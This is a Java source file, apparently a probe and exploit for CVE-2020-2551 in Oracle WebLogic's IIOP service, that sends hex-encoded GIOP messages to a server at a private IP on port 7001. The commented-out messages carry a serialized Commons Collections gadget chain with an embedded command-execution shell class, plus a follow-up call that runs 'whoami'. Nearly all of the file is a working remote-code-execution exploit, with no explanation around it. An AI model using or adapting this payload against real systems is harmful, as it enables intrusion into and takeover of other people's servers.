package CVE20202551;

import cn.hutool.core.util.HexUtil;
import util.HexStringUtil;

import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Arrays;

/**
 * @ClassName: socket
 * @Description: TODO
 * @Author: Summer
 * @Date: 2020/8/3 17:25
 * @Version: v1.0.0
 * @Description:
 **/
public class socket {
    public static void main(String[] args) {
        try {

            Socket s = new Socket("192.168.116.146",7001);

            //向服务器端发送一条消息
            String NameServer = "47494f50010200030000001700000002000000000000000b4e616d6553657276696365";
//            47494f50010200030000001700000002000000000000000b4e616d6553657276696365
//            os.write(HexStringUtil.hexStringToBytes(NameServer));
//            os.flush();
            try {
                byte[] nameserver = sendSocket(NameServer , s);

                System.out.println("GIOP -->  "+HexUtil.decodeHexStr(HexStringUtil.binaryToHexString(nameserver)));
            } catch (Exception e) {
                e.printStackTrace();
                System.out.println("nameserver is error! ");
            }
//            dos.write(bytes);
//            System.out.println(Arrays.toString(bytes));
//            bw.write(Arrays.toString(bytes));
//            bw.write(demo + "测试客户端和服务器通信，服务器接收到消息返回到客户端\n");
//            bw.flush();

            //读取服务器返回的消息


//            BufferedReader br = new BufferedReader(new InputStreamReader(is));
//
//            String mess = br.readLine();

//            if(mess.contains("GIOP")) {
//                System.out.println("存在CVE-2020-2551漏洞!");
//            }else{
//                System.out.println("不存在CVE-2020-2551漏洞!");
//            }

//            System.out.println("服务器：" + mess);

//            String GIOP2 = "47494f5001020000000017a40000000303000000000000000000007800424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000238000000000000014245412c000000100000000000000000e73836f0230c41dc0000000b726562696e645f616e79000000000006000000050000001c00000000000000010000000e3139322e3136382e3133372e3100d253000000010000000c00000000000100200501000100000006000000f4000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000e3139322e3136382e3133372e3100d2530000006400424541080103000000000100000000000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000331320000000000014245412a000000100000000000000000356be9fbfc48db0c00000001000000010000002c00000000000100200000000300010020000100010501000100010100000000030001010000010109050100010000000f0000002000000000000000000000000000000001000000000000000001000000000000004245410300000014000000000000000000000000230c41dc000000004245410000000004000a0301000000000000000100000007736563746573740000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000059524d493a73756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c65723a433030334245443736453333333842423a35354341463530463135434237454135000000007fffff020000003e524d493a7765626c6f6769632e69696f702e50726f7879446573633a373343443941343543424135323933383a373432363138303142393331454630300000007fffff02ffffffffffffff507fffff0a00000051524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61703a353842424138454633304330394645423a364545353934383239453739313039340000000000000002010100007fffff0a00000061524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d65723a353639313138463941313930393646313a33304337393745433238374139373034000000007fffff0a00000043524d493a5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723b3a30303030303030303030303030303030000000000004000000027fffff0a00000062524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d65723a443036433732413043333443423031463a35383736393031313431303242313934000000000000600000001d000000580000000000000040524d493a6a617661782e726d692e434f5242412e436c617373446573633a324241424441303435383741444343433a4346424630324346353239343137364200000000010000000000000000000000007fffff0a00000040524d493a6a617661782e726d692e434f5242412e436c617373446573633a324241424441303435383741444343433a43464246303243463532393431373642007fffff0a0000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000400000000fffffffa7fffff0affffffffffffffc4000000500000004c524d493a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e5472415846696c7465723a30303030303030303030303030303030fffffffc7fffff0a00000065524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e7374616e74696174655472616e73666f726d65723a323344324332464638323744443138363a33343842463437464134383644303342000000007fffff0a00000029524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a303030303030303030303030303030300000000000000088000000010000001d0000007c0000000000000061524d493a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c3a373043443034433745444637384143353a3039353734464331364541434142333300000000000000010000000000000000000000007fffff0a00000061524d493a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c3a373043443034433745444637384143353a30393537344643313645414341423333000000000000000c0101000000000000ffffffff7fffff0a00000019524d493a5b5b423a303030303030303030303030303030300000000000000004000000017fffff0a00000018524d493a5b423a303030303030303030303030303030300000000dbe00000dbacafebabe0000003200ad0a002700620700630a000200640700650a000400620a000400660a000200670a000200680a0002006907006a08006b0a0016006c07006d0a000d006208006e0b006f00700800710a007200730a001600740800750a0016007607007708007808007908007a08007b0a007c007d0a007c007e0a007f00800700810a001e00620a008200830a001e00840a001e00850a001600860700870a002400620b006f008807008907008a0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001f4c73757065726d616e2f7368656c6c732f54334f7249494f505368656c6c3b0100117365745365727665724c6f636174696f6e010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b295601001066696c654f757470757453747265616d01001a4c6a6176612f696f2f46696c654f757470757453747265616d3b010001650100154c6a6176612f6c616e672f457863657074696f6e3b010004706174680100124c6a6176612f6c616e672f537472696e673b0100047465787401000d537461636b4d61705461626c6507006a01000a457863657074696f6e7307008b0100116765745365727665724c6f636174696f6e010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100036374780100164c6a617661782f6e616d696e672f436f6e746578743b0100046e616d65010004636d64730100135b4c6a6176612f6c616e672f537472696e673b010002696e0100154c6a6176612f696f2f496e70757453747265616d3b0100036275660100025b420100036c656e010001490100036f757401001f4c6a6176612f696f2f4279746541727261794f757470757453747265616d3b010003636d6407007707004307008707008c0700470700810100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b07008d0100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000a536f7572636546696c6501001254334f7249494f505368656c6c2e6a6176610c0029002a0100186a6176612f696f2f46696c654f757470757453747265616d0c0029008e01001673756e2f6d6973632f4241534536344465636f6465720c008f00900c009100920c0093002a0c0094002a0100136a6176612f6c616e672f457863657074696f6e010006756e62696e640c0095009601001b6a617661782f6e616d696e672f496e697469616c436f6e74657874010007736563746573740700970c006b008e0100076f732e6e616d650700980c0099003e0c009a009b01000377696e0c009c009d0100106a6176612f6c616e672f537472696e67010007636d642e6578650100022f6301000273680100022d6307009e0c009f00a00c00a100a20700a30c00a400a501001d6a6176612f696f2f4279746541727261794f757470757453747265616d07008c0c00a600a70c009100a80c00a900aa0c0029009201001d73757065726d616e2f7368656c6c732f54334f7249494f505368656c6c0c00ab00ac010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c657401002e7765626c6f6769632f636c75737465722f73696e676c65746f6e2f436c75737465724d617374657252656d6f74650100186a6176612f726d692f52656d6f7465457863657074696f6e0100136a6176612f696f2f496e70757453747265616d010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e010015284c6a6176612f6c616e672f537472696e673b295601000c6465636f6465427566666572010016284c6a6176612f6c616e672f537472696e673b295b420100057772697465010005285b422956010005666c757368010005636c6f7365010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100146a617661782f6e616d696e672f436f6e746578740100106a6176612f6c616e672f53797374656d01000b67657450726f706572747901000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b01000472656164010005285b422949010007285b424949295601000b746f42797465417272617901000428295b42010006726562696e64010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b2956002100240027000100280000000600010029002a0001002b0000002f00010001000000052ab70001b100000002002c00000006000100000012002d0000000c000100000005002e002f00000001003000310002002b000000a40003000400000025bb0002592bb700034e2dbb000459b700052cb60006b600072db600082db60009a700044eb10001000000200023000a0003002c0000001e00070000001f0009002000180021001c0022002000250023002300240026002d000000340005000900170032003300030024000000340035000300000025002e002f0000000000250036003700010000002500380037000200390000000700026307003a00003b000000040001003c0001003d003e0002002b000001b000040008000000a32b120bb6000c990015bb000d59b7000e4d2c120fb90010020001b01211b800124d2cc600242cb600131214b6001599001806bd00165903121753590412185359052b53a7001506bd001659031219535904121a5359052b534eb8001b2db6001cb6001d3a04110400bc083a05033606bb001e59b7001f3a0719041905b60020593606029f001019071905031506b60021a7ffe8bb0016591907b60022b70023b04d01b000020000001a00a0000a001b009f00a0000a0003002c0000003e000f0000002b0009002c0011002d0019002e001b0030002100310059003200650033006c0034006f003500780036008600370093003900a0003c00a1003f002d00000066000a0011000a003f004000020021007f004100370002005900470042004300030065003b004400450004006c0034004600470005006f003100480049000600780028004a004b000700a10000003400350002000000a3002e002f0000000000a3004c0037000100390000003b00061bfc002a07004d5107004eff001f000807004f07004d07004d07004e0700500700510107005200001aff000c000207004f07004d000107003a003b000000040001003c0001005300540002002b0000003f0000000300000001b100000002002c00000006000100000045002d00000020000300000001002e002f00000000000100550056000100000001005700580002003b000000040001005900010053005a0002002b000000490000000400000001b100000002002c0000000600010000004a002d0000002a000400000001002e002f00000000000100550056000100000001005b005c000200000001005d005e0003003b00000004000100590008005f002a0001002b00000075000400010000001cbb000d59b7000e4b2a120fbb002459b70025b900260300a700044bb1000100000017001a000a0003002c000000160005000000150008001600170019001a0017001b001a002d0000001600020008000f003f00400000001b000000340035000000390000000700025a07003a00000100600000000200610000fffffff900000004000000007fffff0affffffffffffef98000000080000000450776e72fffffff9000000050000000000000000fffffffb7fffff0a00000039524d493a5b4c6a6176612e6c616e672e436c6173733b3a303731444138424537463937313132383a324337453535303344394246393535330000000000000004000000017fffff0affffffffffffeed800000008ffffffffffffef107fffff0affffffffffffef080000003600000032524d493a6a617661782e786d6c2e7472616e73666f726d2e54656d706c617465733a303030303030303030303030303030300000fffffffe00000001000000007fffff0a00000038524d493a6a6176612e7574696c2e486173684d61703a383635373335363841323131433031313a303530374441433143333136363044310000000014010100003f400000000000000000001000000000ffffffff7fffff02ffffffffffffee10ffffffffffffee4c7fffff02ffffffffffffee4400000027524d493a6a6176612e6c616e672e4f766572726964653a30303030303030303030303030303030007fffff02fffffffffffffe9c000000017fffff02ffffffffffffedb4ffffffffffffedf07fffff02ffffffffffffede800000022524d493a6a6176612e7574696c2e4d61703a303030303030303030303030303030300000ffffffffffffff58";
//            try {
//                byte[] giop2 = sendSocket(GIOP2 ,s);
//                System.out.println("GIOP2 --> "+HexUtil.decodeHexStr(HexStringUtil.binaryToHexString(giop2)));
//            } catch (Exception e) {
//                e.printStackTrace();
//                System.out.println(" giop2  are error!");
//            }
//
//            String GIOP3 = "47494f5001020000000001210000000403000000000000000000007800424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000238000000000000014245412c000000100000000000000000e73836f0230c41dc0000000c7265736f6c76655f616e790000000004000000050000001c00000000000000010000000e3139322e3136382e3133372e3100d253000000010000000c0000000000010020050100010000000f0000001100000005000000000000000000000001000000004245410300000014000000000000000000000000230c41dc00000000000000010000000773656374657374000000000100";
//            try {
//                byte[] giop3 = sendSocket(GIOP3 , s);
//                System.out.println("GIOP3 --> "+HexUtil.decodeHexStr(HexStringUtil.binaryToHexString(giop3)));
//            } catch (Exception e) {
//                e.printStackTrace();
//                System.out.println(" giop3 are error!");
//            }
//            String GIOP4 = "47494f5001020000000001420000000503000000000000000000008800424541080103000000000c41646d696e536572766572000000000000000044524d493a7765626c6f6769632e636c75737465722e73696e676c65746f6e2e436c75737465724d617374657252656d6f74653a30303030303030303030303030303030000000000432393200000000014245412c000000100000000000000000e73836f0230c41dc000000126765745365727665724c6f636174696f6e00000000000003000000050000001c00000000000000010000000e3139322e3136382e3133372e3100d253000000010000000c0000000000010020050100010000000f000000110000000500000000000000000000000100000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000677686f616d69";
//            try {
//                byte[] giop4 = sendSocket(GIOP4 , s);
//                System.out.println("GIOP4 --> "+ HexUtil.decodeHexStr(HexStringUtil.binaryToHexString(giop4)));
//            } catch (Exception e) {
//                e.printStackTrace();
//                System.out.println(" giop4 are error!");
//            }

        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static byte[] sendSocket(String sendMessage, Socket socket) throws Exception {
        OutputStream out = socket.getOutputStream();
        InputStream is = socket.getInputStream();
        out.write(HexStringUtil.hexStrToBinaryStr(sendMessage));
        out.flush();
        byte[] bytes = new byte[4096];
        int length = is.read(bytes);
        return Arrays.copyOfRange(bytes, 0,length);
    }

}
